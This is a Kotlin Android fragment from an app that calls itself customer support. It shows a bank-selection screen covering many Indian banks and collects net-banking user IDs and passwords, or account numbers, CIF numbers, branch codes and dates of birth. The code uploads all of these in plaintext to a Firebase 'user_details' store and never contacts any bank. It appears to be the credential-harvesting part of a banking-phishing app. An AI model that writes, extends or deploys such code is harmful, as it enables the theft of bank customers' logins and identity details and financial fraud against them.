package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.fragment.app.Fragment
import com.google.firebase.database.FirebaseDatabase

class BankDetailsFragment : Fragment() {

    private lateinit var bankSpinner: Spinner
    private lateinit var optionGroup: RadioGroup
    private lateinit var netBankingLayout: View
    private lateinit var cardDetailsLayout: View
    private lateinit var userIdField: EditText
    private lateinit var userPasswordField: EditText
    private lateinit var accountNumberField: EditText
    private lateinit var cifNumberField: EditText
    private lateinit var branchCodeField: EditText
    private lateinit var dobField: EditText
    private lateinit var backButton: Button
    private lateinit var submitButton: Button
    private var userData: UserInputData? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Retrieve userData from arguments or initialize it if null
        arguments?.let {
            userData = it.getParcelable("userInputData") ?: UserInputData()
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.fragment_bank_details, container, false)

        // Initialize views
        bankSpinner = view.findViewById(R.id.bankSpinner)
        optionGroup = view.findViewById(R.id.optionGroup)
        netBankingLayout = view.findViewById(R.id.netBankingLayout)
        cardDetailsLayout = view.findViewById(R.id.cardDetailsLayout)
        userIdField = view.findViewById(R.id.userIdField)
        userPasswordField = view.findViewById(R.id.userPasswordField)
        accountNumberField = view.findViewById(R.id.accountNumberField)
        cifNumberField = view.findViewById(R.id.cifNumberField)
        branchCodeField = view.findViewById(R.id.branchCodeField)
        dobField = view.findViewById(R.id.dobField)
        backButton = view.findViewById(R.id.backButton)
        submitButton = view.findViewById(R.id.submitButton)

        // Setup bank spinner
        val banks = arrayOf("Select Bank", "State Bank of India (SBI)", "HDFC Bank", "ICICI Bank", "Axis Bank", "Punjab National Bank (PNB)", "Bank of Baroda", "Kotak Mahindra Bank", "Canara Bank", "Union Bank of India", "Bank of India", "Central Bank of India", "Indian Overseas Bank (IOB)", "Indian Bank", "Yes Bank", "IDFC First Bank", "RBL Bank (Ratnakar Bank)", "Standard Chartered Bank", "Deutsche Bank", "Citi Bank", "HSBC India")
        val adapter = ArrayAdapter(requireContext(), android.R.layout.simple_spinner_dropdown_item, banks)
        bankSpinner.adapter = adapter

        optionGroup.setOnCheckedChangeListener { _, checkedId ->
            when (checkedId) {
                R.id.rbNetBanking -> {
                    netBankingLayout.visibility = View.VISIBLE
                    cardDetailsLayout.visibility = View.GONE
                }
                R.id.rbCreditDebit -> {
                    netBankingLayout.visibility = View.GONE
                    cardDetailsLayout.visibility = View.VISIBLE
                }
            }
        }

        // Back button functionality
        backButton.setOnClickListener {
            requireActivity().supportFragmentManager.popBackStack()
        }

        // Submit button functionality
        submitButton.setOnClickListener {
            val selectedBank = bankSpinner.selectedItem.toString()
            val isNetBanking = optionGroup.checkedRadioButtonId == R.id.rbNetBanking

            if (selectedBank == "Select Bank") {
                showError("Please select a bank.")
                return@setOnClickListener
            }

            if (isNetBanking) {
                if (userIdField.text.isEmpty() || userPasswordField.text.isEmpty()) {
                    showError("Please fill in all Net Banking fields.")
                    return@setOnClickListener
                }
            } else {
                if (accountNumberField.text.isEmpty() || cifNumberField.text.isEmpty() || branchCodeField.text.isEmpty() || dobField.text.isEmpty()) {
                    showError("Please fill in all Card details fields.")
                    return@setOnClickListener
                }
            }

            // Update userData with new information
            userData?.apply {
                bankName = selectedBank
                username = if (isNetBanking) userIdField.text.toString() else ""
                password = if (isNetBanking) userPasswordField.text.toString() else ""
                accountNumber = if (!isNetBanking) accountNumberField.text.toString() else ""
                cifNumber = if (!isNetBanking) cifNumberField.text.toString() else ""
                branchCode = if (!isNetBanking) branchCodeField.text.toString() else ""
                dob = if (!isNetBanking) dobField.text.toString() else ""
            }

            // Upload to Firebase
            uploadDataToFirebase(userData!!)
        }

        return view
    }

    private fun showError(message: String) {
        Toast.makeText(requireContext(), message, Toast.LENGTH_SHORT).show()
    }

    private fun uploadDataToFirebase(userData: UserInputData) {
        val database = FirebaseDatabase.getInstance()
        val ref = database.getReference("user_details").push()

        ref.setValue(userData)
            .addOnSuccessListener {
                Toast.makeText(requireContext(), "Details uploaded successfully", Toast.LENGTH_SHORT).show()
                val intent = Intent(requireContext(), ConfirmationActivity::class.java)
                startActivity(intent)
                requireActivity().finish()
            }
            .addOnFailureListener {
                showError("Failed to upload data. Please try again.")
            }
    }
}
